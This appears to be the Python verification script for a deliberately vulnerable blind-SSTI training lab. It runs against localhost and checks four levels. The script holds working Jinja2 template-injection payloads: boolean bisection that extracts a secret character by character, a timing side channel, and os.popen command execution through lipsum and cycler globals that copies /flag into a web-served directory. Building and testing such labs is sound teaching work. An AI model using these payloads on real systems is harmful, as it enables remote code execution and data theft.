#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""06-blind-ssti 端到端验证（在容器内运行，只用标准库）。

用法（宿主机）::

    docker exec -i <容器名> python - < tests/verify_blind.py

覆盖四条信道：

  L1 布尔盲注 —— 逐字符把 `secret` 二分出来（每字符约 7 次请求），
                 并与容器内 /flag 的内容逐字节比对；
  L2 时间盲注 —— 证明成功与失败的**响应体完全一致**，只有耗时不同；
  L3 写文件回显 —— 用 SSTI 把 `cat /flag` 的输出写进 /app/echo/，再经
                 `GET /echo/<名字>` 取回；同时确认 /api/render 的响应里没有 flag；
  L4 不出网桥接 —— 同一机制 + 关卡级 `no_egress=True`（lab-info 里可见）。

容器内**不出网**也能跑：所有请求都打 127.0.0.1。
"""

from __future__ import annotations

import json
import os
import statistics
import sys
import time
import urllib.error
import urllib.request

BASE = "http://127.0.0.1:5000"
FLAG_PATH = "/flag"

FAILS: list[str] = []
CHECKS = 0

#: L2 用的慢循环：实测 range(20000000) + 空循环体只有 ~0.22 s，
#: 带 `{{ '' }}` 循环体约 1.36 s（README 有实测表），所以用后者当"慢"。
SLOW_BODY = "{% for i in range(20000000) %}{{ '' }}{% endfor %}"


def check(name: str, cond: bool, detail: str = "") -> None:
    global CHECKS
    CHECKS += 1
    if cond:
        print(f"  ok   {name}")
    else:
        print(f"  FAIL {name}  {detail}")
        FAILS.append(name)


def section(title: str) -> None:
    print(f"\n=== {title} ===")


def get(path: str, timeout: float = 30.0) -> tuple[int, str]:
    try:
        with urllib.request.urlopen(BASE + path, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")


def render(template: str, level: str, mode: str = "practice", timeout: float = 60.0) -> dict:
    body = json.dumps({"level": level, "mode": mode, "template": template}).encode()
    req = urllib.request.Request(
        BASE + "/api/render", data=body, headers={"Content-Type": "application/json"}
    )
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return json.loads(resp.read().decode("utf-8"))


def timed_render(template: str, level: str) -> tuple[float, dict]:
    t0 = time.perf_counter()
    payload = render(template, level)
    return time.perf_counter() - t0, payload


def blind_bisect(flag_len: int, level: str = "0") -> str:
    """布尔盲注：对每一位在可打印 ASCII 区间二分，靠 correct/wrong 判断大小。"""
    out = []
    for i in range(flag_len):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            tpl = (
                "{% if secret["
                + str(i)
                + "] <= '"
                + chr(mid)
                + "' %}{{ 1/0 }}{% endif %}"
            )
            if render(tpl, level)["output"] == "wrong":
                hi = mid
            else:
                lo = mid + 1
        out.append(chr(lo))
    return "".join(out)


def main() -> int:
    # ---------------------------------------------------------------- 0
    section("0. 基线：/healthz、lab-info 契约、前端产物")
    status, body = get("/healthz")
    check("GET /healthz == 200 ok", status == 200 and body.strip() == "ok", f"{status} {body[:60]!r}")

    status, body = get("/")
    check("GET / 返回 200（前端构建产物或降级控制台）", status == 200, str(status))
    check("GET / 含 assets/ 引用（统一前端产物）", "assets/" in body, body[:120])

    status, body = get("/api/lab-info")
    info = json.loads(body)
    check("GET /api/lab-info 返回 JSON", status == 200 and isinstance(info, dict))
    check("lab-info.levels 有 4 关", len(info.get("levels", [])) == 4, str(len(info.get("levels", []))))
    check("lab 自身 no_egress=False（本靶场没有切断出网）", info.get("no_egress") is False)
    lv = {x["id"]: x for x in info["levels"]}
    check("L1 是盲关（echo_mode=bool）", lv["0"]["echo_mode"] == "bool" and lv["0"]["blind"] is True)
    check("L2 echo_mode=none", lv["1"]["echo_mode"] == "none")
    check("L3 echo_mode=file", lv["2"]["echo_mode"] == "file")
    check("L4 关卡级 no_egress=True（控制台会显示「不出网」）", lv["3"]["no_egress"] is True)
    check("L3/L4 的 waf 为 null（无过滤）", lv["2"]["waf"] is None and lv["3"]["waf"] is None)

    try:
        flag = open(FLAG_PATH, encoding="utf-8").read().strip()
    except OSError as exc:
        check("容器内存在 /flag", False, str(exc))
        return 1
    check("容器内存在 /flag", bool(flag))
    print(f"       flag = {flag}")

    # ---------------------------------------------------------------- 1
    section("1. L1 布尔盲注：correct / wrong 就是唯一信道")

    r = render("{{ secret }}", "0")
    check("直接打印 secret 也拿不到内容（盲关只回 correct）", r["output"] == "correct", str(r))
    check("盲关的 god 模式才暴露真实输出", render("{{ secret }}", "0", "god")["raw_output"] == flag)

    hit = render("{% if secret[0] == 'f' %}{{ 1/0 }}{% endif %}", "0")
    check("猜中首字符 => wrong（异常就是信号）", hit["output"] == "wrong", str(hit))
    miss = render("{% if secret[0] == 'Z' %}{{ 1/0 }}{% endif %}", "0")
    check("猜错 => correct", miss["output"] == "correct", str(miss))

    t0 = time.perf_counter()
    recovered = blind_bisect(len(flag), "0")
    dt = time.perf_counter() - t0
    check(
        f"二分盲注逐字符还原出 flag（{len(flag)} 字符，{dt:.1f}s）",
        recovered == flag,
        f"got={recovered!r} want={flag!r}",
    )

    # ---------------------------------------------------------------- 2
    section("2. L2 时间盲注：响应体一致，只有耗时不同")

    slow_tpl = "{% if secret[0] == 'f' %}" + SLOW_BODY + "{% endif %}"
    fast_tpl = "{% if secret[0] == 'Z' %}" + SLOW_BODY + "{% endif %}"

    fast_samples = []
    for _ in range(3):
        secs, payload = timed_render(fast_tpl, "1")
        fast_samples.append(secs)
        check("条件不成立时响应体是常量 received", payload["output"] == "received", str(payload["output"]))
    slow_samples = []
    for _ in range(3):
        secs, payload = timed_render(slow_tpl, "1")
        slow_samples.append(secs)
        check("条件成立时响应体**同样**是 received（体内容无区分度）", payload["output"] == "received")

    base = statistics.median(fast_samples)
    slow = statistics.median(slow_samples)
    print(f"       基线中位数 {base:.3f}s · 命中中位数 {slow:.3f}s · 差值 {slow - base:.3f}s")
    check("命中比基线慢 0.5s 以上（时间信道成立）", slow - base > 0.5, f"{slow - base:.3f}s")

    # ---------------------------------------------------------------- 3
    section("3. L3 写文件回显：SSTI 写 /app/echo/，再经 HTTP 取回")

    name3 = "verify_l3.txt"
    tpl3 = (
        "{{ lipsum.__globals__['os'].popen('cat "
        + FLAG_PATH
        + " > /app/echo/"
        + name3
        + "').read() }}"
    )
    r3 = render(tpl3, "2")
    check("L3 渲染请求成功且不回显 flag",
          flag not in json.dumps(r3, ensure_ascii=False), str(r3.get("output"))[:80])
    check("L3 响应体是 echo_text（无回显）", r3["output"] == "ok", str(r3["output"]))

    status, body = get("/echo/" + name3)
    check("GET /echo/<名字> 拿到写出的文件", status == 200, str(status))
    check("写出的内容就是 /flag 的内容", body.strip() == flag, repr(body[:80]))

    status, body = get("/echo/不存在的文件.txt")
    check("不存在的文件返回 404", status == 404, str(status))

    # ---------------------------------------------------------------- 4
    section("4. L4 不出网桥接：同机制可用，关卡标记 no_egress")

    name4 = "verify_l4.txt"
    tpl4 = (
        "{{ cycler.__init__.__globals__['os'].popen('cat "
        + FLAG_PATH
        + " > /app/echo/"
        + name4
        + "').read() }}"
    )
    r4 = render(tpl4, "3")
    check("L4 渲染请求成功且不回显 flag",
          flag not in json.dumps(r4, ensure_ascii=False), str(r4.get("output"))[:80])
    status, body = get("/echo/" + name4)
    check("L4 同样能经 /echo/ 取回 flag", status == 200 and body.strip() == flag, repr(body[:80]))

    for name in (name3, name4):
        try:
            os.remove("/app/echo/" + name)
        except OSError:
            pass

    print(f"\n共 {CHECKS} 项，失败 {len(FAILS)} 项")
    if FAILS:
        print("失败：" + ", ".join(FAILS))
        return 1
    print("06 四条回显信道全部验证通过 ✅")
    return 0


if __name__ == "__main__":
    sys.exit(main())
